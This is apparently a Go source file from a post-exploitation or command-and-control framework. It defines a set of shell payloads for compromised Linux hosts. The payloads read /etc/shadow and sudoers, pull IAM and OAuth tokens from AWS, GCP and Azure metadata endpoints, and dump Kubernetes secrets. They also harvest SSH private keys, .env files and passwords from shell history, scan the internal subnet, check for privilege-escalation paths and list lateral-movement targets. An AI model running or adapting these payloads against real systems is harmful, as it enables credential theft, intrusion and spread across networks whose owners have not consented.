package engine

import (
	"encoding/json"
	"log"
)

type reconConfig struct {
	Modules     []string `json:"modules"`
	AutoExtract *bool    `json:"auto_extract,omitempty"`
}

var reconModules = map[string]TaskTemplate{
	"sysinfo": {
		Name:    "System Information",
		CmdType: "shell",
		Payload: `echo "=== HOSTNAME ===" && hostname -f 2>/dev/null || hostname
echo "=== KERNEL ===" && uname -a
echo "=== OS ===" && cat /etc/os-release 2>/dev/null
echo "=== UPTIME ===" && uptime
echo "=== MEMORY ===" && free -h 2>/dev/null
echo "=== DISK ===" && df -h
echo "=== CPU ===" && grep "model name" /proc/cpuinfo 2>/dev/null | head -1 && echo "cores: $(nproc 2>/dev/null)"
echo "=== VIRTUALIZATION ===" && (systemd-detect-virt 2>/dev/null || echo "unknown")
echo "=== SECURITY ===" && (getenforce 2>/dev/null; aa-status 2>/dev/null | head -3; cat /proc/sys/kernel/randomize_va_space 2>/dev/null)`,
	},
	"network": {
		Name:    "Network Enumeration",
		CmdType: "shell",
		Payload: `echo "=== INTERFACES ===" && (ip addr 2>/dev/null || ifconfig 2>/dev/null)
echo "=== ROUTES ===" && (ip route 2>/dev/null || netstat -rn 2>/dev/null)
echo "=== DNS ===" && cat /etc/resolv.conf 2>/dev/null
echo "=== LISTENING PORTS ===" && (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null)
echo "=== ESTABLISHED ===" && (ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null)
echo "=== ARP TABLE ===" && (ip neigh 2>/dev/null || arp -a 2>/dev/null)
echo "=== HOSTS FILE ===" && cat /etc/hosts
echo "=== IPTABLES ===" && (iptables -L -n 2>/dev/null || echo "no access")
echo "=== VPN/TUNNELS ===" && (ip tunnel show 2>/dev/null; ls /etc/openvpn/ 2>/dev/null; ls /etc/wireguard/ 2>/dev/null)`,
	},
	"users": {
		Name:    "User Enumeration",
		CmdType: "shell",
		Payload: `echo "=== CURRENT USER ===" && id
echo "=== LOGGED IN ===" && w
echo "=== LAST LOGINS ===" && last -n 20 2>/dev/null
echo "=== PASSWD (SHELL USERS) ===" && grep -v "nologin\|false" /etc/passwd
echo "=== SHADOW ===" && cat /etc/shadow 2>/dev/null
echo "=== SUDOERS ===" && cat /etc/sudoers 2>/dev/null && cat /etc/sudoers.d/* 2>/dev/null
echo "=== SUDO -L ===" && sudo -l 2>/dev/null
echo "=== GROUP MEMBERSHIPS ===" && for u in $(awk -F: '$7 !~ /nologin|false/ {print $1}' /etc/passwd); do echo "$u: $(groups $u 2>/dev/null)"; done
echo "=== HOME DIRS ===" && ls -la /home/ 2>/dev/null
echo "=== ROOT SSH ===" && ls -la /root/.ssh/ 2>/dev/null`,
	},
	"software": {
		Name:    "Installed Software",
		CmdType: "shell",
		Payload: `echo "=== PACKAGES (SECURITY RELEVANT) ===" && (dpkg -l 2>/dev/null | grep -iE "ssh|sudo|docker|cron|apache|nginx|mysql|postgres|redis|openssl|gcc|python|perl|ruby|node|php" || rpm -qa 2>/dev/null | grep -iE "ssh|sudo|docker|cron|httpd|nginx|mysql|postgres|redis|openssl|gcc|python|perl|ruby|node|php")
echo "=== COMPILERS & DEV TOOLS ===" && for t in gcc cc g++ make python python3 perl ruby node php go; do which $t 2>/dev/null && $t --version 2>/dev/null | head -1; done
echo "=== RUNNING SERVICES ===" && (systemctl list-units --type=service --state=running 2>/dev/null || service --status-all 2>/dev/null)
echo "=== WRITABLE SCRIPTS IN PATH ===" && echo $PATH | tr ':' '\n' | while read d; do find "$d" -writable -type f 2>/dev/null; done`,
	},
	"cloud": {
		Name:    "Cloud Metadata & Credentials",
		CmdType: "shell",
		Payload: `echo "=== AWS METADATA ===" && curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null
echo "=== AWS IAM ROLE ===" && ROLE=$(curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null) && echo "$ROLE" && [ -n "$ROLE" ] && curl -s --connect-timeout 2 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null
echo "=== AWS USER DATA ===" && curl -s --connect-timeout 2 http://169.254.169.254/latest/user-data/ 2>/dev/null
echo "=== AWS CONFIG ===" && cat ~/.aws/credentials 2>/dev/null && cat ~/.aws/config 2>/dev/null
echo "=== GCP METADATA ===" && curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/?recursive=true" 2>/dev/null
echo "=== GCP SERVICE ACCT ===" && curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null
echo "=== GCP CREDS ===" && find / -maxdepth 5 -name "*.json" -exec grep -l "client_email" {} \; 2>/dev/null | head -5
echo "=== AZURE METADATA ===" && curl -s --connect-timeout 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null
echo "=== AZURE TOKEN ===" && curl -s --connect-timeout 2 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null
echo "=== DO METADATA ===" && curl -s --connect-timeout 2 http://169.254.169.254/metadata/v1.json 2>/dev/null
echo "=== ENV SECRETS ===" && env | grep -iE "(key|secret|token|pass|api|credential)" 2>/dev/null`,
	},
	"containers": {
		Name:    "Container Enumeration",
		CmdType: "shell",
		Payload: `echo "=== IN CONTAINER? ===" && cat /proc/1/cgroup 2>/dev/null | head -5 && [ -f /.dockerenv ] && echo "DOCKER CONTAINER DETECTED"
echo "=== DOCKER SOCKET ===" && ls -la /var/run/docker.sock 2>/dev/null && echo "WRITABLE: $(test -w /var/run/docker.sock && echo YES || echo NO)"
echo "=== DOCKER PS ===" && docker ps -a 2>/dev/null
echo "=== DOCKER IMAGES ===" && docker images 2>/dev/null
echo "=== DOCKER INSPECT ===" && docker inspect $(docker ps -q 2>/dev/null | head -5) 2>/dev/null | grep -iE "password|secret|key|token|env" | head -20
echo "=== K8S PODS ===" && kubectl get pods -A 2>/dev/null
echo "=== K8S SECRETS ===" && kubectl get secrets -A -o json 2>/dev/null | grep -oP '"[^"]*": "[^"]*"' | head -20
echo "=== K8S SERVICE ACCOUNT ===" && cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -1
echo "=== K8S CA CERT ===" && ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null`,
	},
	"sensitive_files": {
		Name:    "Sensitive File Discovery",
		CmdType: "shell",
		Payload: `echo "=== PRIVATE KEYS ===" && find / -maxdepth 5 -type f \( -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pfx" -o -name "*.p12" \) 2>/dev/null | while read f; do echo "FILE: $f ($(stat -c '%U:%G %a' "$f" 2>/dev/null))"; done
echo "=== CONFIG FILES ===" && find / -maxdepth 5 -type f \( -name "*.env" -o -name ".env*" -o -name "wp-config.php" -o -name "config.json" -o -name "settings.py" -o -name "database.yml" -o -name "credentials*" -o -name "shadow.bak" -o -name "*.conf" \) 2>/dev/null | head -40
echo "=== BASH HISTORY (PASSWORDS) ===" && for h in /home/*/.bash_history /root/.bash_history; do [ -f "$h" ] && echo "--- $h ---" && grep -iE "pass|token|secret|key|curl.*-u|mysql.*-p|sshpass|wget.*password" "$h" 2>/dev/null; done
echo "=== SSH CONFIG ===" && for d in /home/*/.ssh /root/.ssh; do [ -d "$d" ] && echo "--- $d ---" && cat "$d/config" 2>/dev/null && cat "$d/known_hosts" 2>/dev/null; done
echo "=== GIT CREDENTIALS ===" && find / -maxdepth 4 -name ".git-credentials" -o -name ".gitconfig" 2>/dev/null | while read f; do echo "--- $f ---"; cat "$f" 2>/dev/null; done
echo "=== NETRC ===" && cat ~/.netrc 2>/dev/null && cat /root/.netrc 2>/dev/null
echo "=== WORLD-READABLE SENSITIVE ===" && find /etc -maxdepth 2 -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" \) -perm -o=r 2>/dev/null | xargs grep -liE "password|passwd|secret|key" 2>/dev/null | head -20`,
	},
	"internal_network": {
		Name:    "Internal Network Scan",
		CmdType: "shell",
		Payload: `echo "=== SUBNET DISCOVERY ===" && SUBNET=$(ip route | grep -v default | grep "src" | head -1 | awk '{print $1}') && echo "Scanning: $SUBNET" && BASE=$(echo $SUBNET | cut -d'/' -f1 | cut -d'.' -f1-3)
for i in $(seq 1 254); do (ping -c 1 -W 1 ${BASE}.$i &>/dev/null && echo "ALIVE: ${BASE}.$i") & done; wait
echo "=== COMMON PORTS ===" && for h in $(ip neigh | grep -v FAILED | awk '{print $1}'); do for p in 22 80 443 3306 5432 6379 8080 8443 27017 9200; do (echo >/dev/tcp/$h/$p 2>/dev/null && echo "OPEN: $h:$p") & done; done; wait 2>/dev/null`,
	},
	"privesc": {
		Name:    "Privilege Escalation Check",
		CmdType: "shell",
		Payload: `echo "=== CURRENT PRIVS ===" && id && echo "kernel: $(uname -r)"
echo "=== SUID BINARIES ===" && find / -perm -4000 -type f 2>/dev/null | while read f; do echo "SUID: $f ($(ls -la "$f" 2>/dev/null | awk '{print $3":"$4}'))"; done
echo "=== SGID BINARIES ===" && find / -perm -2000 -type f 2>/dev/null | while read f; do echo "SGID: $f"; done
echo "=== CAPABILITIES ===" && getcap -r / 2>/dev/null | head -30
echo "=== SUDO NOPASSWD ===" && sudo -l 2>/dev/null | grep -i "NOPASSWD"
echo "=== SUDO ALL ===" && sudo -l 2>/dev/null
echo "=== WRITABLE /etc/passwd ===" && [ -w /etc/passwd ] && echo "VULN: /etc/passwd is writable!" || echo "OK"
echo "=== WRITABLE /etc/shadow ===" && [ -w /etc/shadow ] && echo "VULN: /etc/shadow is writable!" || echo "OK"
echo "=== WRITABLE CRON DIRS ===" && ls -la /etc/cron* 2>/dev/null && find /etc/cron* -writable 2>/dev/null
echo "=== DOCKER GROUP ===" && groups 2>/dev/null | grep -q docker && echo "VULN: user in docker group — root escape possible" || echo "OK"
echo "=== LXD GROUP ===" && groups 2>/dev/null | grep -q lxd && echo "VULN: user in lxd group — root escape possible" || echo "OK"
echo "=== WORLD-WRITABLE IN PATH ===" && echo $PATH | tr ':' '\n' | while read d; do find "$d" -writable -type f 2>/dev/null && echo "VULN: writable file in PATH: $d"; done
echo "=== KERNEL EXPLOITS ===" && KVER=$(uname -r)
echo "kernel: $KVER"
echo "$KVER" | grep -qE "^[23]\." && echo "VULN: old kernel, likely exploitable"
echo "=== MOUNTPOINTS ===" && mount | grep -E "nosuid|noexec" && mount | grep -vE "nosuid" | grep -v "proc\|sys\|cgroup"
echo "=== WRITABLE /etc/ld.so ===" && ls -la /etc/ld.so.conf /etc/ld.so.conf.d/ 2>/dev/null && [ -w /etc/ld.so.conf ] && echo "VULN: ld.so.conf writable"
echo "=== DOAS ===" && cat /etc/doas.conf 2>/dev/null
echo "=== PKEXEC ===" && which pkexec 2>/dev/null && pkexec --version 2>/dev/null`,
	},
	"secrets": {
		Name:    "Secret & Credential Harvesting",
		CmdType: "shell",
		Payload: `echo "=== SSH PRIVATE KEYS ===" && for k in /home/*/.ssh/id_* /root/.ssh/id_*; do [ -f "$k" ] && echo "--- $k ---" && head -5 "$k" 2>/dev/null && echo "...(truncated)"; done
echo "=== HISTORY SECRETS ===" && for h in /home/*/.bash_history /root/.bash_history /home/*/.zsh_history /root/.zsh_history; do [ -f "$h" ] && echo "--- $h ---" && grep -iE "pass|token|secret|key|mysql.*-p|sshpass|curl.*-u|wget.*--password|export.*KEY|export.*SECRET|export.*TOKEN" "$h" 2>/dev/null | tail -30; done
echo "=== ENV FILES ===" && find / -maxdepth 5 -name ".env" -o -name ".env.*" -o -name "env.local" 2>/dev/null | while read f; do echo "--- $f ---"; cat "$f" 2>/dev/null; done
echo "=== DB CONNECTION STRINGS ===" && grep -r --include="*.conf" --include="*.cfg" --include="*.ini" --include="*.yml" --include="*.yaml" --include="*.json" --include="*.php" --include="*.py" -iE "mysql://|postgres://|mongodb://|redis://|amqp://|DATABASE_URL|DB_PASSWORD|DB_PASS" /etc /opt /var/www /home 2>/dev/null | head -30
echo "=== WORDPRESS CONFIG ===" && find / -maxdepth 5 -name "wp-config.php" 2>/dev/null | while read f; do echo "--- $f ---"; grep -iE "DB_|AUTH_|SECURE_|NONCE_|define.*pass" "$f" 2>/dev/null; done
echo "=== PROCESS CMDLINES ===" && ps aux 2>/dev/null | grep -iE "pass|token|secret|key" | grep -v grep
echo "=== /proc ENV LEAKS ===" && find /proc -maxdepth 2 -name "environ" -readable 2>/dev/null | while read f; do strings "$f" 2>/dev/null | grep -iE "pass|token|secret|key|api" && echo "(from $f)"; done | head -30
echo "=== BROWSER CREDS ===" && find /home -maxdepth 5 -path "*/.mozilla/firefox/*/logins.json" -o -path "*/.config/google-chrome/*/Login Data" -o -path "*/.config/chromium/*/Login Data" 2>/dev/null
echo "=== GNOME KEYRING ===" && find /home -maxdepth 4 -path "*/.local/share/keyrings/*" 2>/dev/null
echo "=== GPG KEYS ===" && find /home -maxdepth 3 -name "*.gpg" -o -name "secring*" 2>/dev/null`,
	},
	"lateral_targets": {
		Name:    "Lateral Movement Targets",
		CmdType: "shell",
		Payload: `echo "=== SSH KNOWN HOSTS ===" && for f in /home/*/.ssh/known_hosts /root/.ssh/known_hosts; do [ -f "$f" ] && echo "--- $f ---" && awk '{print $1}' "$f" 2>/dev/null | sort -u; done
echo "=== SSH CONFIG HOSTS ===" && for f in /home/*/.ssh/config /root/.ssh/config; do [ -f "$f" ] && echo "--- $f ---" && grep -i "^Host " "$f" 2>/dev/null; done
echo "=== HOSTS FILE ===" && grep -v "^#\|^$\|localhost" /etc/hosts 2>/dev/null
echo "=== AUTHORIZED KEYS ===" && for f in /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys; do [ -f "$f" ] && echo "--- $f ---" && cat "$f" 2>/dev/null; done
echo "=== DB HOSTS ===" && grep -rh --include="*.conf" --include="*.cfg" --include="*.ini" --include="*.yml" --include="*.yaml" --include="*.env" --include="*.json" -iE "host.*=|server.*=|endpoint.*=" /etc /opt 2>/dev/null | grep -vE "localhost|127\.0\.0\.1|^#" | sort -u | head -20
echo "=== ACTIVE CONNECTIONS ===" && (ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null) | awk '{print $5}' | grep -v "^\*\|^Local" | sort -u
echo "=== NFS/SMB SHARES ===" && showmount -e 2>/dev/null; mount | grep -iE "nfs|cifs|smb" 2>/dev/null; cat /etc/fstab 2>/dev/null | grep -iE "nfs|cifs|smb"
echo "=== ANSIBLE/PUPPET/SALT HOSTS ===" && cat /etc/ansible/hosts 2>/dev/null | head -30; cat /etc/puppet/puppet.conf 2>/dev/null | grep server; cat /etc/salt/minion 2>/dev/null | grep master
echo "=== DOCKER NETWORKS ===" && docker network ls 2>/dev/null && docker network inspect $(docker network ls -q 2>/dev/null) 2>/dev/null | grep -E "IPv4|Name" | head -20`,
	},
	"persistence_check": {
		Name:    "Persistence Mechanism Audit",
		CmdType: "shell",
		Payload: `echo "=== CRONTABS (ALL USERS) ===" && for u in $(cut -f1 -d: /etc/passwd); do C=$(crontab -l -u "$u" 2>/dev/null); [ -n "$C" ] && echo "--- $u ---" && echo "$C"; done
echo "=== CRON DIRECTORIES ===" && ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null
echo "=== SYSTEMD SERVICES (NON-DEFAULT) ===" && systemctl list-unit-files --type=service 2>/dev/null | grep -vE "static|masked|disabled" | grep -vE "dbus|systemd|udev|journal|network|ssh|login|getty"
echo "=== RC.LOCAL ===" && cat /etc/rc.local 2>/dev/null
echo "=== INIT.D SCRIPTS ===" && ls -la /etc/init.d/ 2>/dev/null | grep -vE "README|skeleton"
echo "=== PROFILE SCRIPTS ===" && for f in /etc/profile /etc/profile.d/*.sh /etc/bash.bashrc /home/*/.bashrc /home/*/.profile /home/*/.bash_profile /root/.bashrc /root/.profile; do [ -f "$f" ] && echo "--- $f ---" && tail -5 "$f" 2>/dev/null; done
echo "=== AUTHORIZED KEYS ===" && find / -maxdepth 5 -name "authorized_keys" 2>/dev/null | while read f; do echo "--- $f ($(stat -c '%U:%G %a' "$f" 2>/dev/null)) ---"; cat "$f" 2>/dev/null; done
echo "=== LD_PRELOAD ===" && cat /etc/ld.so.preload 2>/dev/null && env | grep LD_PRELOAD
echo "=== KERNEL MODULES ===" && lsmod 2>/dev/null | grep -vE "Module|ip_tables|x_tables|nf_|xt_|ipt_|bridge|stp|llc|overlay"
echo "=== TIMERS ===" && systemctl list-timers --all 2>/dev/null | head -20
echo "=== AT JOBS ===" && atq 2>/dev/null
echo "=== UNUSUAL SSHD CONFIG ===" && grep -iE "AuthorizedKeysFile|PermitRootLogin|PasswordAuthentication|ForceCommand" /etc/ssh/sshd_config 2>/dev/null`,
	},
	"process_inspect": {
		Name:    "Process & Service Inspection",
		CmdType: "shell",
		Payload: `echo "=== RUNNING PROCESSES ===" && ps auxf 2>/dev/null || ps aux
echo "=== PROCESSES WITH SECRETS IN CMDLINE ===" && ps aux 2>/dev/null | grep -iE "pass|token|secret|key|api" | grep -v grep
echo "=== LISTENING SERVICES ===" && (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | while read line; do
  PID=$(echo "$line" | grep -oP 'pid=\K[0-9]+' 2>/dev/null)
  [ -n "$PID" ] && echo "$line -> $(cat /proc/$PID/cmdline 2>/dev/null | tr '\0' ' ')"
done
echo "=== OPEN FILES (INTERESTING) ===" && lsof 2>/dev/null | grep -iE "\.key|\.pem|\.env|shadow|passwd|\.conf|\.db|\.sqlite" | head -20
echo "=== SOCKETS ===" && lsof -i 2>/dev/null | grep -v "ESTABLISHED\|TIME_WAIT" | head -30
echo "=== SCREEN/TMUX SESSIONS ===" && screen -ls 2>/dev/null; tmux ls 2>/dev/null`,
	},
}

func ReconTasks(config string) []TaskTemplate {
	var cfg reconConfig
	if err := json.Unmarshal([]byte(config), &cfg); err != nil {
		log.Printf("[-] Recon: invalid config, using defaults: %v", err)
	}

	if len(cfg.Modules) == 0 {
		cfg.Modules = []string{"sysinfo", "network", "users", "software", "cloud", "containers", "sensitive_files", "internal_network", "privesc", "secrets", "lateral_targets", "persistence_check", "process_inspect"}
	}

	var tasks []TaskTemplate
	for _, mod := range cfg.Modules {
		if t, ok := reconModules[mod]; ok {
			tasks = append(tasks, t)
		}
	}
	return tasks
}
